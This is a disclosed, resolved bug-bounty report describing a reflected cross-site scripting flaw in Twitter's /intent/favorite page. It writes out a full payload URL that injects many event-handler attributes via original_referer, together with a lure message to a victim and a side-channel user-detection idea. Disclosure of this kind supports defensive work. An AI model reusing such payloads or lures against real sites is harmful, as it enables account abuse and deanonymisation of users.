---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '48516'
original_report_id: '48516'
title: Redirect URL in /intent/ functionality is not properly escaped
weakness: Cross-site Scripting (XSS) - Generic
team_handle: x
created_at: '2015-02-21T23:47:32.767Z'
disclosed_at: '2015-02-24T21:55:21.923Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Redirect URL in /intent/ functionality is not properly escaped

## Metadata

- HackerOne Report ID: 48516
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: x
- Disclosed At: 2015-02-24T21:55:21.923Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Choose a tweet from a user that the victim follows but not favorited. 

Send the victim message like "Please favorite this: https://twitter.com/intent/favorite?original_referer=%20style%3Dfont-size%3A1000%3Bonautocompleteerror%3Dalert(0)%20onautocomplete%3Dalert(0)%20onwaiting%3Dalert(0)%20onvolumechange%3Dalert(0)%20ontoggle%3Dalert(0)%20ontimeupdate%3Dalert(0)%20onsuspend%3Dalert(0)%20onsubmit%3Dalert(0)%20onstalled%3Dalert(0)%20onshow%3Dalert(0)%20onselect%3Dalert(0)%20onseeking%3Dalert(0)%20onseeked%3Dalert(0)%20onscroll%3Dalert(0)%20onresize%3Dalert(0)%20onreset%3Dalert(0)%20onratechange%3Dalert(0)%20onprogress%3Dalert(0)%20onplaying%3Dalert(0)%20onplay%3Dalert(0)%20onpause%3Dalert(0)%20onmousewheel%3Dalert(0)%20onmouseup%3Dalert(0)%20onmouseover%3Dalert(0)%20onmouseout%3Dalert(0)%20onmousemove%3Dalert(0)%20onmouseleave%3Dalert(0)%20onmouseenter%3Dalert(0)%20onmousedown%3Dalert(0)%20onloadstart%3Dalert(0)%20onloadedmetadata%3Dalert(0)%20onloadeddata%3Dalert(0)%20onload%3Dalert(0)%20onkeyup%3Dalert(0)%20onkeypress%3Dalert(0)%20onkeydown%3Dalert(0)%20oninvalid%3Dalert(0)%20oninput%3Dalert(0)%20onfocus%3Dalert(0)%20onerror%3Dalert(0)%20onended%3Dalert(0)%20onemptied%3Dalert(0)%20ondurationchange%3Dalert(0)%20ondrop%3Dalert(0)%20ondragstart%3Dalert(0)%20ondragover%3Dalert(0)%20ondragleave%3Dalert(0)%20ondragenter%3Dalert(0)%20ondragend%3Dalert(0)%20ondrag%3Dalert(0)%20ondblclick%3Dalert(0)%20oncuechange%3Dalert(0)%20oncontextmenu%3Dalert(0)%20onclose%3Dalert(0)%20onclick%3Dalert(0)%20onchange%3Dalert(0)%20oncanplaythrough%3Dalert(0)%20oncanplay%3Dalert(0)%20oncancel%3Dalert(0)%20onblur%3Dalert(0)%20onabort%3Dalert(0)%20onwebkitfullscreenerror%3Dalert(0)%20onwebkitfullscreenchange%3Dalert(0)%20onwheel%3Dalert(0)%20onselectstart%3Dalert(0)%20onsearch%3Dalert(0)%20onpaste%3Dalert(0)%20oncut%3Dalert(0)%20oncopy%3Dalert(0)%20onbeforepaste%3Dalert(0)%20onbeforecut%3Dalert(0)%20onbeforecopy%3Dalert(0)&tweet_id=440322224407314432 where 440322224407314432 is that tweet id

The problem is original_referer is not escaped if current Referrer is twitter.com. However it's very hard to get Referer like that because t.co is used everywhere and it kills Referers. So we are going to use this functionality itself twice to get proper Header. 

Normally twitter ignores user supplied "original_referer" unless Referer is twitter.com 

When the victim clicks the link it shows a dialog with "Favorite" button which has a hidden field in it:
 
<input type="hidden" name="referer" value="/intent/favorite?original_referer=%20style%3Dfont-size%3A1000%3Bonautocompleteerror%3Dalert(0)%20onautocomplete%3Dalert(0)%20onwaiting%3Dalert(0)%20onvolumechange%3Dalert(0)%20ontoggle%3Dalert(0)%20ontimeupdate%3Dalert(0)%20onsuspend%3Dalert(0)%20onsubmit%3Dalert(0)%20onstalled%3Dalert(0)%20onshow%3Dalert(0)%20onselect%3Dalert(0)%20onseeking%3Dalert(0)%20onseeked%3Dalert(0)%20onscroll%3Dalert(0)%20onresize%3Dalert(0)%20onreset%3Dalert(0)%20onratechange%3Dalert(0)%20onprogress%3Dalert(0)%20onplaying%3Dalert(0)%20onplay%3Dalert(0)%20onpause%3Dalert(0)%20onmousewheel%3Dalert(0)%20onmouseup%3Dalert(0)%20onmouseover%3Dalert(0)%20onmouseout%3Dalert(0)%20onmousemove%3Dalert(0)%20onmouseleave%3Dalert(0)%20onmouseenter%3Dalert(0)%20onmousedown%3Dalert(0)%20onloadstart%3Dalert(0)%20onloadedmetadata%3Dalert(0)%20onloadeddata%3Dalert(0)%20onload%3Dalert(0)%20onkeyup%3Dalert(0)%20onkeypress%3Dalert(0)%20onkeydown%3Dalert(0)%20oninvalid%3Dalert(0)%20oninput%3Dalert(0)%20onfocus%3Dalert(0)%20onerror%3Dalert(0)%20onended%3Dalert(0)%20onemptied%3Dalert(0)%20ondurationchange%3Dalert(0)%20ondrop%3Dalert(0)%20ondragstart%3Dalert(0)%20ondragover%3Dalert(0)%20ondragleave%3Dalert(0)%20ondragenter%3Dalert(0)%20ondragend%3Dalert(0)%20ondrag%3Dalert(0)%20ondblclick%3Dalert(0)%20oncuechange%3Dalert(0)%20oncontextmenu%3Dalert(0)%20onclose%3Dalert(0)%20onclick%3Dalert(0)%20onchange%3Dalert(0)%20oncanplaythrough%3Dalert(0)%20oncanplay%3Dalert(0)%20oncancel%3Dalert(0)%20onblur%3Dalert(0)%20onabort%3Dalert(0)%20onwebkitfullscreenerror%3Dalert(0)%20onwebkitfullscreenchange%3Dalert(0)%20onwheel%3Dalert(0)%20onselectstart%3Dalert(0)%20onsearch%3Dalert(0)%20onpaste%3Dalert(0)%20oncut%3Dalert(0)%20oncopy%3Dalert(0)%20onbeforepaste%3Dalert(0)%20onbeforecut%3Dalert(0)%20onbeforecopy%3Dalert(0)&amp;tweet_id=440322224407314432"> 

The victim sees Return to previous site link and when clicks, it instantly loads the same page with original_referer=Injection.

Injection is inserted "as is" and it can overwrite CSS styles of the link and also inject malicious events in mouseover etc.

Probably there's a better or more reliable way to make XSS payload execute, but I can't find it with blackbox.

How i noticed that? There's another bug i was making a tool for - probing username of current user from given database listening to side channel - twitter does window.close() if the user both follows & favorited this tweet. Demo http://homakov.github.io/twitterdetect.html 
Not sure if you want to fix that one too?

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
